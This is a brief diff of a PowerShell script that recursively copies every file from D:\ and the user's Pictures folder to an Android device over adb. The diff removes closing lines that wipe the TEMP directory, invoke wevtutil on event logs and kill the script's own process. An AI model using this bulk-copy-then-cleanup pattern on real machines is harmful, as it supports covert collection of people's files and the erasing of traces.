@@ -20,11 +20,3 @@ Get-ChildItem -Path "D:\", "C:\Users\$user\Pictures" -Recurse -File -Force |
     ForEach-Object {
         & $adbExecutable push "$($_.FullName)" "$androidDestinationPath"
     }
-
-$tempDirectory = $env:TEMP
-
-Remove-Item -Path "$tempDirectory\*" -Force -ErrorAction SilentlyContinue
-
-wevtutil el | Out-Null
-
-Stop-Process -Id $PID
